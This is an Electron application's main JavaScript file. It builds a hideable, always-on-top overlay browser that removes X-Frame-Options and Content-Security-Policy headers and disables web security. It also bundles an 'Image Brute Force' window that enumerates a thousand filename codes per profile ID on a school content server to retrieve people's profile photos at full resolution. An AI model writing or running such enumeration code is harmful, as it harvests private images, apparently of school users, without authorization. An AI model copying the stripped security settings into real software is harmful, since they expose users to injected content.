const { app, BrowserWindow, session, globalShortcut, ipcMain, dialog, nativeImage } = require("electron");
const fs = require("fs");
const path = require("path");

let mainWindow, leAIWindow, imgBruteForceWindow;
let opacityLevel = 1.0;
let launchUrl = "https://thatoneweirddev.github.io/arch/";
let isHidden = false;

const settingsPath = path.join(app.getPath("userData"), "background-settings.json");
const customBgPath = path.join(app.getPath("userData"), "custom-bg.jpeg");

const loadSettings = () => {
  if (fs.existsSync(settingsPath)) {
    return JSON.parse(fs.readFileSync(settingsPath));
  }
  return { useCustom: false };
};

const saveSettings = (settings) => {
  fs.writeFileSync(settingsPath, JSON.stringify(settings));
};

const injectCustomBackground = (win) => {
  if (!fs.existsSync(customBgPath)) return;

  const dataURL = nativeImage.createFromPath(customBgPath).toDataURL();
  const script = `
    document.addEventListener('DOMContentLoaded', () => {
      const style = document.createElement('style');
      style.innerHTML = \`
        body {
          background-image: url('${dataURL}');
          background-size: cover;
          background-repeat: no-repeat;
          background-attachment: fixed;
        }
      \`;
      document.head.appendChild(style);
    });
  `;
  win.webContents.executeJavaScript(script);
};

const parseArchUrl = (archUrl) => {
  if (!archUrl) return launchUrl;
  let url = archUrl.replace(/^arch:\/\//, "").trim();
  if (/^https?:\/\//.test(url) || url.includes(".")) {
    return `https://${url.replace(/^https?:\/\//, "")}`;
  } else {
    return `https://www.google.com/search?q=${encodeURIComponent(url)}`;
  }
};

let startupUrl = process.argv.find(arg => arg.startsWith("arch://"));
if (startupUrl) {
  launchUrl = parseArchUrl(startupUrl);
}

function fadeToOpacity(win, targetOpacity = 1.0, step = 0.05, interval = 10) {
  let current = 0.0;
  win.setOpacity(current);
  win.show();

  const fade = setInterval(() => {
    current = Math.min(current + step, targetOpacity);
    win.setOpacity(current);
    if (current >= targetOpacity) {
      clearInterval(fade);
    }
  }, interval);
}

const createMainWindow = () => {
  mainWindow = new BrowserWindow({
    width: 400,
    height: 400,
    x: 20,
    y: 20,
    opacity: 0,
    transparent: true,
    frame: false,
    alwaysOnTop: true,
    resizable: true,
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      webSecurity: false,
      webviewTag: true,
      devTools: false
    },
  });

  const htmlContent = `
    <html>
      <head>
        <style>
          body { margin: 0; overflow: hidden; }
          .drag-bar {
            width: 100%;
            height: 30px;
            background: rgba(0, 0, 0, 0.2);
            -webkit-app-region: drag;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 9999;
          }
          webview {
            position: absolute;
            top: 30px;
            width: 100%;
            height: calc(100% - 30px);
            border: none;
          }
        </style>
      </head>
      <body>
        <div class="drag-bar"></div>
        <webview 
          id="webview"
          src="${launchUrl}" 
          allowpopups 
          disablewebsecurity
          webpreferences="javascript=yes, plugins=no">
        </webview>
        <script>
          const { ipcRenderer } = require('electron');
          const webview = document.getElementById('webview');
          ipcRenderer.on('navigate', (_, newUrl) => { webview.src = newUrl; });
          webview.addEventListener('dom-ready', () => {
            webview.insertCSS("::-webkit-scrollbar { display: none; }");
            ipcRenderer.send('webview-ready');
          });
        </script>
      </body>
    </html>
  `;

  mainWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(htmlContent)}`);

  session.defaultSession.webRequest.onHeadersReceived({ urls: ["*://*/*"] }, (details, callback) => {
    const headers = details.responseHeaders;
    for (const key in headers) {
      const lower = key.toLowerCase();
      if (lower === "x-frame-options" || lower === "content-security-policy") {
        delete headers[key];
      }
    }
    callback({ cancel: false, responseHeaders: headers });
  });

  ipcMain.once("webview-ready", () => {
    const settings = loadSettings();
    if (settings.useCustom) injectCustomBackground(mainWindow);
    fadeToOpacity(mainWindow, opacityLevel);
  });

  mainWindow.once("ready-to-show", () => {
    mainWindow.webContents.send("navigate", launchUrl);
  });
};

const createLEAIWindow = () => {
  leAIWindow = new BrowserWindow({
    width: 500,
    height: 500,
    x: 60,
    y: 60,
    opacity: 0,
    transparent: true,
    frame: false,
    alwaysOnTop: true,
    resizable: true,
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      webSecurity: false,
      devTools: false
    },
  });

  const leAIHtml = `
    <html>
      <head>
        <style>
          body { margin: 0; overflow: hidden; }
          .drag-bar {
            width: 100%;
            height: 30px;
            background: rgba(0, 0, 0, 0.2);
            -webkit-app-region: drag;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 9999;
          }
          iframe {
            position: absolute;
            top: 30px;
            width: 100%;
            height: calc(100% - 30px);
            border: none;
          }
        </style>
      </head>
      <body>
        <div class="drag-bar"></div>
        <iframe src="https://thatoneweirddev.github.io/LE-AI/" sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-modals"></iframe>
      </body>
    </html>
  `;

  leAIWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(leAIHtml)}`);

  leAIWindow.once("ready-to-show", () => {
    fadeToOpacity(leAIWindow, opacityLevel);
  });
};

const createImgBruteForceWindow = () => {
  if (imgBruteForceWindow) {
    imgBruteForceWindow.focus();
    return;
  }

  imgBruteForceWindow = new BrowserWindow({
    width: 360,
    height: 480,
    x: 100,
    y: 100,
    resizable: false,
    alwaysOnTop: true,
    frame: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      devTools: true
    },
  });

  const bruteForceHTML = `
    <html>
    <head>
      <title>Image Brute Force</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          margin: 15px;
          user-select: none;
          background: white;
          color: #333;
        }
        label {
          font-weight: bold;
          display: block;
          margin-bottom: 6px;
        }
        input[type=text] {
          width: 100%;
          padding: 6px;
          margin-bottom: 10px;
          font-size: 14px;
          box-sizing: border-box;
        }
        button {
          width: 100%;
          padding: 8px;
          font-weight: bold;
          border: none;
          border-radius: 4px;
          cursor: pointer;
          color: #fff;
          margin-top: 6px;
        }
        #startBtn {
          background: #28a745;
          margin-top: 0;
        }
        #clearBtn {
          background: #dc3545;
        }
        #status {
          margin-top: 10px;
          font-size: 14px;
          min-height: 22px;
          color: #333;
        }
        #imgDisplay {
          margin-top: 10px;
          text-align: center;
        }
        #imgDisplay img {
          max-width: 300px;
          max-height: 300px;
        }
      </style>
    </head>
    <body>
      <label for="profileIdInput">Profile ID:</label>
      <input id="profileIdInput" type="text" placeholder="e.g. 6868120" />
      <button id="startBtn">Start Search</button>
      <button id="clearBtn">Clear</button>
      <div id="status"></div>
      <div id="imgDisplay"></div>

      <script>
        const batchSize = 40;
        const max = 999;
        const base = "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/888/user/large_user_";
        const extLow = ".jpg?resize=75,75";

        let found = false;

        const status = document.getElementById("status");
        const imgDisplay = document.getElementById("imgDisplay");
        const profileInput = document.getElementById("profileIdInput");
        const startBtn = document.getElementById("startBtn");
        const clearBtn = document.getElementById("clearBtn");

        const clearResults = () => {
          found = false;
          status.textContent = "";
          imgDisplay.innerHTML = "";
        };

        const launchBatch = (start, id) => {
          for (let i = start; i < start + batchSize && i <= max; i++) {
            const code = i.toString().padStart(3, "0");
            const url = \`\${base}\${id}_\${code}\${extLow}\`;
            const img = new Image();
            img.src = url;
            img.onload = () => {
              if (!found) {
                found = true;
                const highResUrl = url.replace("resize=75,75", "resize=999,999");
                const highImg = new Image();
                highImg.src = highResUrl;
                imgDisplay.innerHTML = "";
                imgDisplay.appendChild(highImg);
                status.textContent = \`Image found: code \${code}\`;
              }
            };
          }
          if (!found && start + batchSize <= max) {
            status.textContent = \`Searching codes \${start} to \${start + batchSize - 1}...\`;
            requestAnimationFrame(() => launchBatch(start + batchSize, id));
          }
          if (!found && start + batchSize > max) {
            status.textContent = "No image found.";
          }
        };

        startBtn.onclick = () => {
          clearResults();
          const id = profileInput.value.trim();
          if (!id) {
            status.textContent = "Please enter a Profile ID.";
            return;
          }
          status.textContent = "Starting search...";
          launchBatch(0, id);
        };

        clearBtn.onclick = () => {
          clearResults();
          profileInput.value = "";
          status.textContent = "Cleared.";
        };
      </script>
    </body>
    </html>
  `;

  imgBruteForceWindow.loadURL(`data:text/html;charset=utf-8,${encodeURIComponent(bruteForceHTML)}`);

  imgBruteForceWindow.on('closed', () => {
    imgBruteForceWindow = null;
  });
};

app.setAsDefaultProtocolClient("arch");

app.on("open-url", (event, url) => {
  event.preventDefault();
  const newUrl = parseArchUrl(url);
  if (mainWindow) {
    mainWindow.webContents.send("navigate", newUrl);
  } else {
    launchUrl = newUrl;
  }
});

const gotLock = app.requestSingleInstanceLock();
if (!gotLock) {
  app.quit();
} else {
  app.on("second-instance", (event, argv) => {
    const url = argv.find(arg => arg.startsWith("arch://"));
    if (url) {
      const parsedUrl = parseArchUrl(url);
      if (mainWindow) {
        mainWindow.webContents.send("navigate", parsedUrl);
        if (isHidden) {
          mainWindow.setOpacity(opacityLevel);
          mainWindow.setIgnoreMouseEvents(false);
          isHidden = false;
        }
        mainWindow.show();
      } else {
        launchUrl = parsedUrl;
        createMainWindow();
      }
    }
  });
}

app.whenReady().then(() => {
  createMainWindow();

  globalShortcut.register("CommandOrControl+Option+=", () => {
    opacityLevel = Math.min(opacityLevel + 0.05, 1);
    if (!isHidden) {
      if (mainWindow) mainWindow.setOpacity(opacityLevel);
      if (leAIWindow) leAIWindow.setOpacity(opacityLevel);
    }
  });

  globalShortcut.register("CommandOrControl+Option+-", () => {
    opacityLevel = Math.max(opacityLevel - 0.05, 0.2);
    if (!isHidden) {
      if (mainWindow) mainWindow.setOpacity(opacityLevel);
      if (leAIWindow) leAIWindow.setOpacity(opacityLevel);
    }
  });

  globalShortcut.register("CommandOrControl+Option+H", () => {
    if (!isHidden) {
      if (mainWindow) {
        mainWindow.setOpacity(0);
        mainWindow.setIgnoreMouseEvents(true);
      }
      if (leAIWindow) {
        leAIWindow.setOpacity(0);
        leAIWindow.setIgnoreMouseEvents(true);
      }
      isHidden = true;
    } else {
      if (mainWindow) {
        mainWindow.setIgnoreMouseEvents(false);
        mainWindow.setOpacity(opacityLevel);
      }
      if (leAIWindow) {
        leAIWindow.setIgnoreMouseEvents(false);
        leAIWindow.setOpacity(opacityLevel);
      }
      isHidden = false;
    }
  });

  // Removed CommandOrControl+Option+B shortcut for background toggle

  globalShortcut.register("Command+Option+P", () => {
    createImgBruteForceWindow();
  });

  createLEAIWindow();
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});

app.on("activate", () => {
  if (BrowserWindow.getAllWindows().length === 0) createMainWindow();
});
